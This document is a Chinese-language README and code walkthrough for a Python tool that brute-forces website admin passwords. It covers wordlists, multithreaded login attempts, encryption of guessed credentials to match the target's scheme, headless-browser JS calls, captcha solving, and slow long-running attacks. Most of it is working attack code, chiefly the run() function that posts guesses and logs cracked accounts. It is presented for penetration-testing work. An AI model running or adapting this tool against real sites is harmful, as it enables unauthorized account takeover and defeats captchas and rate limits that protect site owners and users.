# 介绍

攻防实战中爆破网站后台密码时，经常会遇到各式各样的请求格式以及特殊需求，比如：

1. 用户名或密码需要经过特殊加密
2. 请求头中需要携带数字签名，而数字签名需要通过调用某个JS函数获得
3. 想要每次请求时携带随机的XFF头
4. 请求体中需要携带CSRF Token
5. 图片验证码识别
6. 想要把爆破工具放在服务器上以极慢的请求速度长期运行
7. ...

为了解决以上问题，于是有了这个项目。

# 特点

1. 使用 Python + Requests + PyCryptodome + selenium 的组合进行开发
2. 提前预置了常见的加密/哈希算法，如：RSA、AES、MD5，登录时直接调用即可实现用户名密码加密功能
3. 支持使用selenium加载JS文件并调用其中的函数（selenium仅负责加载并调用JS代码，不负责发起登录）
4. 支持验证码识别，并将识别失败的请求单独记录到文件中，方便重新尝试登录
5. 支持多线程并发登录操作，以及设置每次发起请求前延迟固定时间

# 使用教程（同时也是代码解析）

## 一、安装Python所需依赖库

```
# 必须
python -m pip install requests requests-ntlm pycryptodome lxml

# 可选，selenium用于执行JS脚本
python -m pip install selenium

# 可选，如果调用了验证码识别模块，则需要安装以下依赖
python -m pip install pillow onnxruntime

# 可选，onnxruntime模块运行可能会需要安装以下VC运行时
https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist
```

## 二、设置密码字典

定位到如下代码位置，`USERNAME`、`PASSWORD` 这两个全局变量储存的就是用户名和密码的字典列表，可以在里面填入一些自定义的账号或密码，该列表后续还会通过读取文件进行扩充：

```python
USERNAME = ["admin"]   # USERNAME = USERNAME + USERNAME_FILE_PATH + USERPASS_FILE_PATH[0]
PASSWORD = ["123456"]  # PASSWORD = PASSWORD + PASSWORD_FILE_PATH + USERPASS_FILE_PATH[1]
```

以下三个全局变量指定的是 `用户名字典文件路径`、`密码字典文件路径`、`用户名密码对字典文件路径（admin:123456）`，这三个全局变量可以被注释，如果变量被注释，则不会读取对应的字典文件

```python
USERNAME_FILE_PATH = r"username.txt" # 代码被注释、空字符串或None就不读取
PASSWORD_FILE_PATH = r"password.txt" # 代码被注释、空字符串或None就不读取
USERPASS_FILE_PATH = r"userpass.txt" # 代码被注释、空字符串或None就不读取
```

> 脚本对以上三个全局变量进行以下操作：
> `USERNAME_FILE_PATH` 字典文件中的内容，以行为单位，读取后加入 `USERNAME` 变量
> `PASSWORD_FILE_PATH` 字典文件中的内容，以行为单位，读取后加入 `PASSWORD` 变量
> `USERPASS_FILE_PATH` 字典文件中的内容，以行为单位，读取后使用 `:` 符号分割字符串，前半段加入 `USERNAME` 变量，后半段加入 `PASSWORD` 变量

## 三、设置其他的全局变量

设置其他的全局变量，通过注释基本能了解含义

```python
# 只爆破一个账号
ONLY_ONCE = False

# 线程并发数
THREADS = 1

# 每个线程发起登录后暂停时长，单位秒
DELAY = 1

# 是否使用代理，主要用于调试
USE_PROXY = True

# 设置代理
PROXIES = {
    "http": "http://127.0.0.1:8083",
    "https": "http://127.0.0.1:8083"
}
```

## 四、编写加密算法

爆破后台时经常会遇到密码经过加密或哈希后再提交的情况，脚本中内置了多种常见的加密算法，如果实战中发现网站所用的加密算法不在以下列表中，或输出格式不正确，也可以自行补充、调整：

DES加密，输出Base64格式，密钥需要自行调整

```python
def DES_encrypt(message: str) -> str:
    cipher = DES.new(key=b'12345678', iv=b'12345678', mode=DES.MODE_CBC)
    message = pad(message.encode('utf-8'), DES.block_size, style='pkcs7')
    encrypted = cipher.encrypt(message)
    encrypted = base64.b64encode(encrypted) # BASE64
    #encrypted = binascii.hexlify(encrypted) # HEX
    return encrypted.decode('utf-8') #.upper()
```

AES加密，输出Base64格式，密钥需要自行调整

```python
def AES_encrypt(message: str) -> str:
    cipher = AES.new(key=b'1234567890ABCDEF', iv=b'1234567890ABCDEF', mode=AES.MODE_CBC)
    message = pad(message.encode('utf-8'), AES.block_size, style='pkcs7')
    encrypted = cipher.encrypt(message)
    encrypted = base64.b64encode(encrypted) # BASE64
    #encrypted = binascii.hexlify(encrypted) # HEX
    return encrypted.decode('utf-8') #.upper()
```

RSA加密，输出Base64格式，密钥需要自行调整

```python
def RSA_encrypt(message: str) -> str:
    pubkey = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyyD6Zn7VNrR/YknPProx
P9oEzkxeG+VCFLwQ+k2cAWuYWQKSnXSW/UX3sHLIyLXsorKQe19pQOIjssr46KN+
PQbDVG7zaj6RZZlTC+q6/kXwRw0v9wXQ2dXBjNdCDNNwop/GxavvKhLJonKRgVFm
2Y4cUxxcL/ZukvJ5aJAaHoRaf7/jq4vTDWARyroFh6pEN7TGg3acwH9YSpkOX5sV
n7pT9qwFOZ+DdvIUOIvO3hIRA1PDQOSVJRawsffwqFCzxeZMmeakEr7Tn4NavkVL
oXdRoE29N6JHoBBinjNd/yLCE352E2M/WJeYNhlugzVyFNcuyckqsIl5Hrm3qHvT
YwIDAQAB
-----END PUBLIC KEY-----"""
    pubkey = RSA.importKey(pubkey)
    cipher = PKCS1_v1_5.new(pubkey)
    message = message.encode('utf-8')
    encrypted = cipher.encrypt(message)
    encrypted = base64.b64encode(encrypted) # BASE64
    #encrypted = binascii.hexlify(encrypted) # HEX
    return encrypted.decode('utf-8') #.upper()
```

MD5哈希，输出HEX格式

```python
def MD5_hash(message: str) -> str:
	hash = MD5.new()
	hash.update(message.encode('utf-8'))
	return hash.hexdigest()
```

## 五、JS脚本调用（可选）

如果遇到提交的某些数据需要调用网页中的某些JS函数才能获得，则可以使用以下代码来实现JS的载入和调用：

```python
#from selenium.webdriver.chrome.options import Options
#from selenium import webdriver

# 以无头模式启动Chrome浏览器
BROWSER_OPTIONS = Options()
BROWSER_OPTIONS.add_argument('--headless')
BROWSER_OPTIONS.add_argument('--disable-gpu')

# 载入网页中的JS脚本，这里的URL需要调整为目标网站的JS链接
BROWSER = webdriver.Chrome(options=BROWSER_OPTIONS)
BROWSER.get('data:text/html;charset=utf-8,<script src="https://example.com/js/jsencrypt.min.js"></script>')

# 载入自定义JS脚本（仅是载入，还没有运行），这里就以简单的RSA加密功能为例，此步骤创建了一个JSEncrypt对象，并设置了RSA公钥
BROWSER.execute_script(r'''
pk = "-----BEGIN PUBLIC KEY-----\n";
pk += "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2hQp7K25U5kQqE/WFX7f\n";
pk += "hq+YeaLCps8jiUZfIVmq8w2AtHMgdzsea7KCp1K98pcNg3bvdjBoxyfRB2uox0d8\n";
pk += "NzE6QZRTHT3LS57n6BVq4z+nGpXw4kiyIZYhflZnKph8pmbI4pucQaOj+0yUIYrs\n";
pk += "yRsHwAIpeGAxFhmgzGNYdxQ+UwUHk9tZqXdHfIIqd2/rbbbFLO6VnzQstRJTQrwa\n";
pk += "78NyznlEkmeOXPKMuh/WgrkA3+6cMYH6mnmt3zPzU0YnZDXsSpGViyErRty7s3O5\n";
pk += "X/u59C8ScMnvk52lVGYsAikAX8sL/rF6JNFke2A5CfSjtKKeGldU8LbWffF457xb\n";
pk += "yQIDAQAB\n";
pk += "-----END PUBLIC KEY-----";
cipher = new JSEncrypt;
cipher.setPublicKey(pk);
''')

# 调用无头浏览器中的JSEncrypt对象，对username、password变量进行RSA加密 （这里才是开始正式调用JS函数进行加密）
username_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', username)
password_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', password)

# 别忘了在脚本退出前关闭浏览器，释放系统资源
BROWSER.quit()
```

## 六、验证码识别（可选）

这里所使用的验证码识别模块是改版的[DdddOcr](https://github.com/sml2h3/ddddocr)，感谢作者提供的训练模型及使用代码

```python
import requests
import captchadet

# 引入验证码识别模型
MODEL = captchadet.init_model()

# 验证码识别
url = "https://example.com"
session = requests.Session()
response = session.get(url + "/login/vcode")
captcha = captchadet.identify(MODEL, response.content) # 这里 captcha 就是识别结果
```

## 七、开始编写爆破函数

上面编写的代码都是预备环节，接下来开始编写真正负责发起登录操作的 `run` 函数：

```python
def run(username, password): # 爆破函数，返回 (no_exception, found_password)
    ...
```

> 该函数由 `futures.ThreadPoolExecutor` 线程池负责调度，每调用一次 `run` 函数，就发起一次登录操作

> `run` 函数的参数 `username`、`password` 也由线程池负责自动填充

> `run` 函数的返回值为两个布尔值 (no_exception, found_password)
> + `no_exception` 指示了此次登录操作没有遭遇异常（如：服务器拒绝连接，返回的内容无法解析），如果一切正常，返回True，否则返回False
> + `found_password` 指示了此次登录是否找到了正确密码，如果判断找到了密码，返回True，否则返回False

这里给出一个简单的爆破例子，只要掌握requests模块的用法，相信你能很轻易的读懂以下代码，在这个例子中，判断登录密码是否找到，主要看服务器的响应中，是否包含 "Login failed" 或 "Unknown user" 字段：

> `username` 和 `password` 参数可以调用前面提到的加密算法进行加密，同时也可以结合上述的验证码识别、JS函数调用等操作，项目的代码中还提供更多可能会用到的代码，如：使用Xpath获取CSRF Token、使用NTLM认证等

```python

# 设置Headers
HEADERS = requests.utils.default_headers()
HEADERS.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
    "Connection": "close",
})

# 设置Cookies
COOKIES = {
    'SESSIONID': '',
}

def run(username, password): # 爆破函数，返回 (no_exception, found_password)

    time.sleep(DELAY) # 延迟一段时间再爆破

    try:
        url = "https://example.com"
        session = requests.Session()

        data = {
            "username": username,
            "password": RSA_encrypt(password)
        }
        response = session.post(url + "/login.html",
            data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
            allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)

        if "Login failed" in response.text:
            return True, False

        if "Unknown user" in response.text:
            return True, False
        
        output = f"[++] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}"
        write_to_file(FOUND_OUTPUT_PATH, FOUND_OUTPUT_LOCK, f"{output}\n")
        print(output)
        return True, True

    except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
        write_to_file(EXCEPTION_OUTPUT_PATH, EXCEPTION_OUTPUT_LOCK, f"{username}:{password}\n")
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}")
        return False, False

    except Exception as e:
        write_to_file(EXCEPTION_OUTPUT_PATH, EXCEPTION_OUTPUT_LOCK, f"{username}:{password}\n")
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}, detail:")
        print(traceback.format_exc())
        return False, False
```

编写完 `run` 函数后，便可以使用 `python bftool.py` 进行调试运行

## 八、线程池调度

+ 代码中 `# =================== [ 启动多线程爆破 ] ===================` 以下的部分都是负责线程池调度和负责日志输出的代码，建议保持默认即可

+ 线程池支持 `Ctrl+C` 异常捕捉，所以可以使用键盘中断程序运行

+ 本工具每隔10分钟就会以百分比的形式汇报一次进度，方便预估脚本运行时间

+ 每个线程运行期间如果遭遇异常，就会累加异常计数，如果下一个线程能正常完成请求，就会将异常计数归0，如果异常计数累计达到10的时候，程序就会退出，避免无意义的发起请求

+ 成功爆破的密码会记录在 `found.txt` 文件里，如果遭遇异常（如：网络连接中断、服务器拒绝连接），则登录异常的密码会记录在 `exception.txt` 中，方便重新再跑一遍